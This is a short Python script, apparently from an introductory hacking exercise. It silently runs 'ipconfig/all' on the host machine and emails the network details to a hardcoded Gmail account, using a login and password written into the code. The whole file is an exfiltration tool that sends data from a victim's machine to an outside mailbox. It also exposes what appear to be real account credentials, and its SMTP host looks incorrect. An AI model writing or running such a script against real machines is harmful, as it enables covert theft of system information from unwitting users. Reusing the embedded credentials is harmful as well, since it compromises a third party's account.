import subprocess,smtplib

def send_email(email,password,msg):
    server = smtplib.SMTP("smtp.google.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,msg)
    server.quit()

command = "ipconfig/all"
result = subprocess.check_output(command,shell=True)
send_email("krutikgambhir@gmail.com","Pyro&pro15",result)